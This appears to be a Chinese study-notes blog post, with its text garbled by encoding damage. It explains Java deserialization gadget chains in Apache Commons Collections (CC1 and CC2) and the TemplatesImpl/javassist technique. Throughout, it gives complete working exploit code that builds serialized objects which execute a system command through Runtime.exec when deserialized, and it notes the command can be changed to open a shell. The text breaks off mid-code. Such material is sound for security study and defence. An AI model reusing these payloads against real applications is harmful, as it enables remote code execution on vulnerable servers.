&lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;        &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;        &lt;java.version&gt;1.7&lt;/java.version&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.1&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;            &lt;version&gt;4.0&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.javassist&lt;/groupId&gt;            &lt;artifactId&gt;javassist&lt;/artifactId&gt;            &lt;version&gt;3.25.0-GA&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå…³äºåŠ¨æ€ä»£ç†çš„ä¾‹å­ã€‚</p><blockquote><p>1.javaä¸­ä»£ç†ç±»çš„ä½œç”¨æ˜¯:è°ƒç”¨ä¸å¯ä»¥ç›´æ¥è¢«å®ä¾‹åŒ–çš„æ¥å£æ–¹æ³•ã€‚<br>2.åŠ¨æ€ä»£ç†å¯ä»¥ç›´æ¥â€åˆ›å»ºâ€æŸä¸ªæ¥å£çš„å®ä¾‹ï¼Œå¯¹å…¶æ–¹æ³•è¿›è¡Œè°ƒç”¨.<br>3.è°ƒç”¨æŸä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä»£ç†ç±»çš„invokeæ–¹æ³•.</p></blockquote><p>å…ˆå®šä¹‰ä¸€ä¸ªæ¥å£ã€‚å®ƒæœ‰ä¸€ä¸ªhelloworldæ–¹æ³•ã€‚</p><pre><code class="java">package top.bycsec;public interface Hello {    void helloworld(String name);}</code></pre><p>æ¥ä¸‹æ¥è°ƒç”¨è¿™ä¸ªexpã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªhandler.å®ƒå®ç°äº†InvocationHandlerè¿™ä¸ªæ¥å£ã€‚åŒæ—¶éœ€è¦é‡å†™invokeæ–¹æ³•ã€‚æ­¤å¤„æˆ‘ä»¬è®©ä»–åœ¨æ–¹æ³•åä¸ºhelloworldæ—¶è¾“å‡ºè‡ªå®šä¹‰å†…å®¹<br>ç„¶åå®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡hello.ä»–éœ€è¦ClassLoader,è¦ä»£ç†çš„æ¥å£æ•°ç»„ä»¥åŠè°ƒç”¨æ¥å£æ—¶è§¦å‘çš„å¯¹åº”æ–¹æ³•ä½œä¸ºæ„é€ å‚æ•°ã€‚<br>exp</p><pre><code class="java">package top.bycsec;import java.lang.reflect.Proxy;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class exp {    public static void main(String[] args) throws Exception {        InvocationHandler handler = new InvocationHandler(){            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {                if (method.getName().equals(&quot;helloworld&quot;)) {                    System.out.println(&quot;Hello, &quot; + args[0]);                }                return null;            }        };        Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Hello.class},handler);        hello.helloworld(&quot;byc_404&quot;);    }}</code></pre><p>è¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨æ¥å£çš„helloworldæ—¶ã€‚å°±ä¼šè§¦å‘invokeæ–¹æ³•é‡Œçš„å†…å®¹ã€‚<br>è¾“å‡º<code>Hello, byc_404</code></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹cc1é“¾å­çš„å†…å®¹ã€‚é¦–å…ˆä»æ‰§è¡Œå‘½ä»¤çš„åå°„gadgetå¼€å§‹ã€‚è¿™é‡Œæˆ‘ç¡®è®¤è¿‡ä¸€éï¼Œåº”è¯¥æ˜¯ç¬¬ä¸€éƒ¨åˆ†è·ŸCC5æ—¶å°±çœ‹è¿‡äº†ã€‚ç»“æœç°åœ¨å·²ç»å¿˜å…‰äº†â€¦â€¦æ‰€ä»¥å†çœ‹ä¸€éã€‚</p><p>é¦–å…ˆæ˜¯commonscollectionsè¿™ä¸ªåŒ…é‡ŒTrandsformerè¿™ä¸ªæ¥å£</p><pre><code class="java">package org.apache.commons.collections;public interface Transformer {    Object transform(Object var1);}</code></pre><p>å®ƒå®ç°äº†ç±»å‹è½¬æ¢çš„åŠŸèƒ½ã€‚å…¶ä¸­å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»ä¸»è¦æœ‰ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åé¢æ„é€ payloadè¦ç”¨åˆ°çš„.</p><blockquote><p>InvokerTransformer<br>ConstantTransformer<br>ChainedTransformer<br>ä»–ä»¬éƒ½å®ç°äº† Transformer ä»¥åŠ Serializableæ¥å£ã€‚</p></blockquote><p>çœ‹ä¸‹ä»–ä»¬çš„transformæ–¹æ³•<br>InvokeTransformer</p><pre><code class="java">public Object transform(Object input) {    if (input == null) {        return null;    } else {        try {            Class cls = input.getClass();            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);            return method.invoke(input, this.iArgs);        } catch (NoSuchMethodException var5) {            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);        } catch (IllegalAccessException var6) {            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);        } catch (InvocationTargetException var7) {            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);        }    }}</code></pre><p>ä¸€ä¸ªéå¸¸å…¸å‹çš„åå°„è°ƒç”¨æ–¹æ³•çš„åŠŸèƒ½</p><p>ConstantTransformer</p><pre><code class="java">public Object transform(Object input) {    return this.iConstant;}public ConstantTransformer(Object constantToReturn) {    this.iConstant = constantToReturn;}</code></pre><p>è¿”å›æŸå‚æ•°ã€‚å¦‚æœå»çœ‹äº†å®ƒçš„æ„é€ æ–¹æ³•å°±ä¼šå‘ç°å…¶å®transformæ˜¯ä¸€ä¸ªåŸå°ä¸åŠ¨è¿”å›çš„åŠŸèƒ½ã€‚</p><p>ChainedTransformer</p><pre><code class="java">public Object transform(Object object) {    for(int i = 0; i &lt; this.iTransformers.length; ++i) {        object = this.iTransformers[i].transform(object);    }    return object;}</code></pre><p>æ‰§è¡Œä¸€ä¸ªforå¾ªç¯è¿›è¡Œå¾ªç¯è°ƒç”¨ã€‚å¯¹æ¯ä¸ªä¼ å…¥çš„transformeréƒ½è°ƒç”¨å…¶transformæ–¹æ³•å¹¶ä½œä¸ºä¸‹ä¸€æ¬¡çš„å‚æ•°ã€‚</p><p>å¦‚æœç›´æ¥æŠ½è±¡ç‚¹ç†è§£ï¼Œå¤§æ¦‚æ˜¯èƒ½ç†è§£ä¸‹é¢çš„expçš„</p><pre><code class="java">package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.*;public class cc1 {    public static void main(String[] args){        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class }, new Object[] {                        &quot;getRuntime&quot;, new Class[0] }),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, new Object[0] }),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});        chain.transform(123);    }}</code></pre><p>æ•´ä½“ä¸Šæ˜¯ä¸€ä¸ªChainedTransformerå¾ªç¯è°ƒç”¨transformçš„è¿‡ç¨‹ã€‚å…¶ä¸­ConstantTransformerè·å–åˆ°Runtimeçš„ç±»ï¼Œåé¢å¾ªç¯è°ƒç”¨äº†ä¸‰ä¸ªinvokeè·å–æ–¹æ³•æ‰§è¡Œã€‚</p><p>ä¸‹é¢ç»†èŠ‚åŒ–çš„è§£é‡Šä¸‹.æ¯•ç«Ÿccé“¾å­æ‰€æœ‰å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†éƒ½æ˜¯è¿™æ¡é“¾(æ²¡è®°é”™çš„è¯)</p><p>å…ˆè¯´InvokeTransformerçš„transformæ–¹æ³•ã€‚ä¸Šé¢æºç é‡Œè¯´æ˜äº†å®ƒä¸»è¦æ˜¯ä¸€ä¸ªåå°„çš„è¿‡ç¨‹ã€‚å…¶æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚</p><pre><code class="java">try {    Class cls = input.getClass();    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);    return method.invoke(input, this.iArgs);</code></pre><p>æœ€å¤§çš„å¥½å¤„å°±æ˜¯è¿™é‡Œæ‰€æœ‰åå°„å‚æ•°éƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å…¶å®è¿™é‡Œå°±èƒ½rce.</p><pre><code class="java">Runtime runtime = Runtime.getRuntime();Transformer invoketransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;});invoketransformer.transform(runtime);</code></pre><p>åªä¸è¿‡æ˜¾ç„¶æˆ‘ä»¬æ²¡æœ‰ç›´æ¥ä¼ å…¥ä¸€ä¸ª<code>Runtime.getRuntime()</code>è¿™æ ·ä¸€ä¸ªå®ä¾‹çš„å¯èƒ½ã€‚æ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸€ä¸‹å…¶ä»–çš„ç±»ä½œè¾…åŠ©ã€‚</p><p>æ¯”å¦‚è¯´ä¸Šé¢æåˆ°çš„ConstantTransformer.å…¶transformæ–¹æ³•ä¼šè¿”å›è‡ªèº«ã€‚æ‰€ä»¥è¯´å¯ä»¥</p><pre><code class="java">Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);Transformer invoketransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;});invoketransformer.transform(constantTransformer);</code></pre><p>å†åŠ ä¸ŠChainedTransformä¼šè°ƒç”¨å…¶è¾“å…¥çš„transformè¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥æ¥åˆ°ccåå°„expçš„é›å½¢</p><pre><code class="java">ChainedTransformer chain = new ChainedTransformer(new Transformer[]{        new ConstantTransformer(Runtime.getRuntime()),        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})});chain.transform(123);</code></pre><p>æ­¤æ—¶å·²ä¸å†éœ€è¦è¾“å…¥å˜é‡ä¸ºå¯¹è±¡ï¼Œè€Œæ˜¯å¯ä»¥ä¸ºä»»æ„å€¼(æ­¤å¤„ä¸º123)ã€‚</p><p>åªä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ›¾ç»è¯´è¿‡</p><blockquote><p>javaååºåˆ—æŸç±»æ—¶,è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„</p></blockquote><p>æ­¤å¤„Runtime.getRuntime()è¿˜æ˜¯è¿”å›äº†runtimeå¯¹è±¡ï¼Œå®ƒä¸æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å³ååºåˆ—åŒ–æ—¶ä¸Šè¿°expä¼šæŠ¥é”™æŠ›å‡ºNotSerializableExceptionã€‚</p><p>å½“ç„¶è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¸å…è®¸ç›´æ¥è·å–çš„è¯ï¼Œç›´æ¥åŠ¨æ€è°ƒç”¨å°±å¥½äº†ã€‚ä¹Ÿå°±æ˜¯ç»§ç»­ç”¨åå°„è·å–Runtime.<br>æ‰€ä»¥æ‰æœ‰äº†æœ€å®Œæ•´çš„expä¸­</p><pre><code class="java">ChainedTransformer chain = new ChainedTransformer(new Transformer[] {    new ConstantTransformer(Runtime.class),    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {            String.class, Class[].class }, new Object[] {            &quot;getRuntime&quot;, new Class[0] }),    new InvokerTransformer(&quot;invoke&quot;, new Class[] {            Object.class, Object[].class }, new Object[] {            null, new Object[0] }),    new InvokerTransformer(&quot;exec&quot;,            new Class[] { String.class }, new Object[]{&quot;calc&quot;})});chain.transform(123);</code></pre><p>ç¬¬ä¸€æ­¥åå°„ä½¿ç”¨getMethodè·å–getRuntimeè¿™ä¸ªæ–¹æ³•å¯¹è±¡ã€‚å†invokeè·å–getRuntimeçš„æ‰§è¡Œç»“æœã€‚æœ€åç›´æ¥åå°„æ‰§è¡Œexec calc.æˆ–è€…ä¼ å­—ç¬¦ä¸²æ•°ç»„æ‰§è¡Œç‰¹æ®Šå‘½ä»¤å¼¹shell.</p><p>åˆ°è¿™ä¸€æ­¥ä¸ºæ­¢è¾¾æˆäº†ï¼š <strong>ååºåˆ—åŒ–æ—¶æ‰§è¡Œtransformæ–¹æ³•å³å¯rce</strong>.ä¸‹é¢å°±æ˜¯æ‰¾å¯ç”¨ç±»é“¾å­äº†ã€‚å› ä¸ºä¸å¯èƒ½ç›´æ¥å°±åœ¨readObjecté‡Œè°ƒç”¨transformå§ã€‚</p><p>ä¸‹é¢æ˜¯cc1ä¸­é“¾å­çš„å¼€å§‹ã€‚<br>org.apache.commons.collections.map.LazyMap å®ƒå®ç°äº†Serializableæ¥å£å¹¶å­˜åœ¨readObjectæ–¹æ³•ã€‚</p><p>LazyMapçš„getæ–¹æ³•</p><pre><code class="java">public Object get(Object key) {    if (!super.map.containsKey(key)) {        Object value = this.factory.transform(key);        super.map.put(key, value);        return value;    } else {        return super.map.get(key);    }}</code></pre><p><code>this.factory.transform(key)</code>å°±æ˜¯ä¸€ä¸ªè°ƒç”¨äº†transformçš„ä¾‹å­ã€‚é‚£ä¹ˆåªè¦factoryå¯æ§å°±èƒ½è°ƒç”¨ä¸Šé¢çš„åå°„rceäº†ã€‚</p><p>çœ‹ä¸‹æ„é€ æ–¹æ³•ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/36.PNG" class="lazyload" data-srcset="36.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è™½ç„¶åªè¦å®ä¾‹åŒ–çš„è¯å°±èƒ½æ§åˆ¶factoryäº†ã€‚ä½†æ˜¯è¿™ä¸æ˜¯ä¸€ä¸ªpublicçš„æ„é€ æ–¹æ³•ï¼Œåœ¨javaä¸­æƒ³è¦è·å–åˆ°è¿™ä¸ªæ„é€ æ–¹æ³•è¿˜æ˜¯å¾—ç”¨åå°„ã€‚<br>æ­¤æ—¶çš„expå·²ç»å¯ä»¥å†™æˆ</p><pre><code class="java">public static void main(String[] args) throws Exception {    ChainedTransformer chain = new ChainedTransformer(new Transformer[] {            new ConstantTransformer(Runtime.class),            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                    String.class, Class[].class }, new Object[] {                    &quot;getRuntime&quot;, new Class[0] }),            new InvokerTransformer(&quot;invoke&quot;, new Class[] {                    Object.class, Object[].class }, new Object[] {                    null, new Object[0] }),            new InvokerTransformer(&quot;exec&quot;,                    new Class[] { String.class }, new Object[]{&quot;calc&quot;})});    HashMap innermap = new HashMap();    Constructor constructor = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;).getDeclaredConstructor(Map.class, Transformer.class);    constructor.setAccessible(true);    LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);    map.get(123);    }</code></pre><p>æ‰€ä»¥ï¼Œæœ€åä¹Ÿæ˜¯æœ€éš¾çš„ä¸€ç‚¹å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨getå¹¶ä¼ é€’ä»»æ„å€¼çš„åœ°æ–¹ï¼Œæ¥è°ƒç”¨æˆ‘ä»¬lazymapçš„getæ–¹æ³•ã€‚è¿™ä¹Ÿå°±æ˜¯ä½œè€…çš„å¼ºå¤§ä¹‹å¤„ã€‚</p><p>jdk1.7ç‰ˆæœ¬ä¸‹æ‰¾åˆ°çš„æ˜¯sun.reflect.annotation.AnnotationInvocationHandler<br>æ³¨æ„ä½ ç›´æ¥å¯¼å…¥æ˜¯å¯¼ä¸äº†è¿™ä¸ªç±»çš„ã€‚å¯ä»¥åœ¨jreçš„rt.jar ä¸­æ‰¾åˆ°è¿™ä¸ª\sun\reflect\annotation\AnnotationInvocationHandler.class</p><pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {        var1.defaultReadObject();        AnnotationType var2 = null;        try {            var2 = AnnotationType.getInstance(this.type);        } catch (IllegalArgumentException var9) {            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        }        Map var3 = var2.memberTypes();        Iterator var4 = this.memberValues.entrySet().iterator();        ......</code></pre><p>æ³¨æ„è¿™é‡ŒreadObjectåˆè°ƒç”¨äº†<code>this.memberValuesçš„entrySet</code>æ–¹æ³•ã€‚å¦‚æœè¿™é‡Œçš„memberValuesæ˜¯ä¸ªä»£ç†ç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨memberValueså¯¹åº”handlerçš„invokeæ–¹æ³•ï¼Œcc1ä¸­å°†handlerè®¾ç½®ä¸ºAnnotationInvocationHandlerï¼ˆå…¶å®ç°äº†InvocationHandlerï¼Œæ‰€ä»¥å¯ä»¥è¢«è®¾ç½®ä¸ºä»£ç†ç±»çš„handlerï¼‰</p><p>è¿™ä¹Ÿå°±æ˜¯java çš„åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚è°ƒç”¨entrysetè¿™ä¸ªæ–¹æ³•å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ä»£ç†çš„<code>invoke</code>.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/37.PNG" class="lazyload" data-srcset="37.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>invokeé‡Œåˆè°ƒç”¨äº†memberValuesçš„get.é‚£ä¹ˆåªè¦ä»¤memberValuesä¸ºæˆ‘ä»¬æ„é€ å¥½çš„Lazymapå¯¹è±¡å³å¯</p><p>final exp</p><pre><code class="java">package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bag.HashBag;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.LazyMap;import sun.reflect.annotation.AnnotationParser;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.IdentityHashMap;import java.util.Map;public class cc1 {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(java.lang.Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),        };        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        Constructor constructor = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;).getDeclaredConstructor(Map.class, Transformer.class);        constructor.setAccessible(true);        HashMap hashMap = new HashMap&lt;String, String&gt;();        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);        constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);        constructor.setAccessible(true);        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), new Class[]{Map.class}, invo);        constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);        constructor.setAccessible(true);        Object obj = constructor.newInstance(Deprecated.class, proxy);        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));        oos.writeObject(obj);        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));        ois.readObject();        ois.close();    }}</code></pre><ul><li>CommonCollections2</li></ul><p>é¦–å…ˆæ³¨æ„æ˜¯CommonsCollections4çš„ä¾èµ–</p><p>èµ·ç‚¹æ˜¯<br>java.util.PriorityQueue#readObject</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException {    // Read in size, and any hidden stuff    s.defaultReadObject();    // Read in (and discard) array length    s.readInt();    queue = new Object[size];    // Read in all elements.    for (int i = 0; i &lt; size; i++)        queue[i] = s.readObject();    // Elements are guaranteed to be in &quot;proper order&quot;, but the    // spec has never explained what that might be.    heapify();}private void heapify() {    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)        siftDown(i, (E) queue[i]);}private void siftDown(int k, E x) {    if (comparator != null)        siftDownUsingComparator(k, x);    else        siftDownComparable(k, x);}private void siftDownUsingComparator(int k, E x) {    int half = size &gt;&gt;&gt; 1;    while (k &lt; half) {        int child = (k &lt;&lt; 1) + 1;        Object c = queue[child];        int right = child + 1;        if (right &lt; size &amp;&amp;            comparator.compare((E) c, (E) queue[right]) &gt; 0)            c = queue[child = right];        if (comparator.compare(x, (E) c) &lt;= 0)            break;        queue[k] = c;        k = child;    }    queue[k] = x;}</code></pre><p>è¿™é‡Œqueueå¯æ§ã€‚ç„¶åä¸€æ¡é“¾èµ°å‘heapify =&gt; siftDown =&gt; siftDownUsingComparator =&gt; comparator.compare</p><p>è¿™é‡Œå°±å¯ä»¥å¼€å¯æ–°çš„gadgetäº†ã€‚æ¯”å¦‚cc2é“¾å­ä¸­ä½¿ç”¨çš„æ˜¯<br>org.apache.commons.collections4.comparators.TransformingComparator çš„åŒåcompareæ–¹æ³•ã€‚</p><pre><code class="java">public int compare(I obj1, I obj2) {    O value1 = this.transformer.transform(obj1);    O value2 = this.transformer.transform(obj2);    return this.decorated.compare(value1, value2);}</code></pre><p>transformæ–¹æ³•çš„ä½œç”¨è‡ªç„¶æ˜¯ä¹‹å‰çš„ä¸€å¥—åå°„ç»„åˆæ‹³è¿›è¡Œrceäº†ã€‚æ‰€ä»¥éœ€è¦<code>transformer</code>å¯æ§ã€‚è€Œä»æ„é€ æ–¹æ³•å»çœ‹çš„è¯ä¼šå‘ç°ä¹Ÿæ˜¯å¯æ§çš„ã€‚</p><p>è¿™é‡Œå°±å¯ä»¥å†™ä¸€ä¸ªexp</p><pre><code class="java">package top.bycsec;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;public class cc2 {    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class }, new Object[] {                        &quot;getRuntime&quot;, new Class[0] }),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, new Object[0] }),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});        TransformingComparator comparator = new TransformingComparator(chain);        PriorityQueue queue = new PriorityQueue(1);        queue.add(1);        queue.add(2);        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        field.setAccessible(true);        field.set(queue,comparator);        try{            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));            inputStream.readObject();        }catch(Exception e){            e.printStackTrace();        }    }}</code></pre><p>è¿™é‡Œé¦–å…ˆæ³¨æ„queueåŠ äº†ä¸¤ä¸ªå…ƒç´ ï¼Œè¿™æ˜¯å› ä¸ºsizeä¸å¤§äº1çš„è¯æ— æ³•è¿›å…¥siftDownæ–¹æ³•ã€‚ç„¶åqueue.addè¿™æ®µä»£ç ä¸èƒ½æ”¾åˆ°åå°„å®ä¾‹åŒ–comparatorçš„åé¢ã€‚å› ä¸ºä»£ç æ®µä¸­å¦‚æœcomparatorä¸ä¸ºnullä¼šæ”¾ä¸è¿›å»å…ƒç´ ã€‚</p><p>ç„¶åå…¶å®ä¸Šé¢è¿™ä¸ªexpå¹¶ä¸æ˜¯ysoserial CC2çš„expé“¾å­ã€‚å®ƒä½¿ç”¨çš„æ˜¯javassist + TemplatesImplã€‚é¦–å…ˆç®€å•è¯´æ˜ä¸‹javassist,å®ƒæä¾›äº†ä¿®æ”¹å­—èŠ‚ç çš„åŠŸèƒ½ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬æ‰‹åŠ¨ç”Ÿæˆä¸€ä¸ªbyc404.class</p><pre><code class="java">package top.bycsec;import javassist.*;public class cc2 {    public static void createPseson() throws Exception {        ClassPool pool = ClassPool.getDefault();        CtClass cc = pool.makeClass(&quot;byc&quot;);        String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;        // åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥ä»£ç         cc.makeClassInitializer().insertBefore(cmd);        String ClassName = &quot;byc404&quot;;        cc.setName(ClassName);        // å†™å…¥.class æ–‡ä»¶        cc.writeFile();    }    public static void main(String[] args) {        try {            createPseson();        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/38.PNG" class="lazyload" data-srcset="38.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åƒè¿™æ ·èƒ½å¤Ÿç›´æ¥æ§åˆ¶staticæ–¹æ³•çš„è¯,é‚£ä¹ˆå®ƒåœ¨å®ä¾‹åŒ–æ—¶å°±ä¼šè¢«ç›´æ¥æ‰§è¡Œã€‚</p><p>æ¥ä¸‹æ¥çœ‹çœ‹å®ƒçœŸæ­£çš„æ ¸å¿ƒTemplatesImplçš„ä½¿ç”¨</p><pre><code class="java">public synchronized Transformer newTransformer()    throws TransformerConfigurationException{    TransformerImpl transformer;    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,        _indentNumber, _tfactory);    if (_uriResolver != null) {        transformer.setURIResolver(_uriResolver);    }    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {        transformer.setSecureProcessing(true);    }    return transformer;}</code></pre><p>è·Ÿè¿›getTransletInstance</p><pre><code class="java">private Translet getTransletInstance()    throws TransformerConfigurationException {    try {        if (_name == null) return null;        if (_class == null) defineTransletClasses();        // The translet needs to keep a reference to all its auxiliary        // class to prevent the GC from collecting them        AbstractTranslet translet = (AbstractTranslet) 